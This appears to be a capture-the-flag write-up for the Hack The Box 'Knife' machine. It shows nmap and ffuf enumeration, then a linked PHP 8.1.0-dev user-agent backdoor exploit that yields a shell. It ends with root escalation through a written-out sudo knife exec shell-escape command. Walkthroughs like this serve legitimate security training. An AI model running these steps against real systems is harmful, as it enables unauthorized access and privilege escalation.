## ENUMERATION

```jsx
nmap -p- --min-rate=10000 -oN nmap 10.10.10.242 -v

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We see 2 ports open 80 and 22

enum for web

```jsx
ffuf -u http://10.10.10.242/FUZZ -ic -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.242/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 64
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 5815, Words: 646, Lines: 221, Duration: 414ms]

```

ran fuff but nothing was there

The web page was also clean
![image](https://github.com/user-attachments/assets/925789e8-be43-4f5d-b998-209be191580b)
I searched forphp8.1.0 and there was a cve of rce using the user agent

## EXPLOITATION

https://www.exploit-db.com/exploits/49933

```jsx
python3 exp.py
Enter the full host url:
http://knife.htb

Interactive shell is opened on http://knife.htb 
Can't acces tty; job crontol turned off.
$ whoami
james

$ ls /home/james
user.txt
```

Here we got our rev shell

## POST EXPLOITATION

i tired to see and binary we can run with sudo privs
![image](https://github.com/user-attachments/assets/ba198885-172d-418a-817e-f69d4a833022)
i got this binary knife

This binary is capable of running some ruby core scripts

we can run sudo commands using the command 

```jsx
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

Executing this i go error  

```jsx
no input file selected.
```
![image](https://github.com/user-attachments/assets/d08abbc6-ef4a-4a12-8eea-6bfacef94a51)

This error is probably becuase we are running a php/php-cgi and we have to provide a input file.

Getting a reverse shell

![image](https://github.com/user-attachments/assets/2cead4a8-3874-471d-ad09-9898e8ea6e98)

And we got our reverse shell (sh)

After executing 

```jsx
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

We got our reverse shell

![image](https://github.com/user-attachments/assets/b10be3b6-294c-485a-bd61-c8250eacafdd)
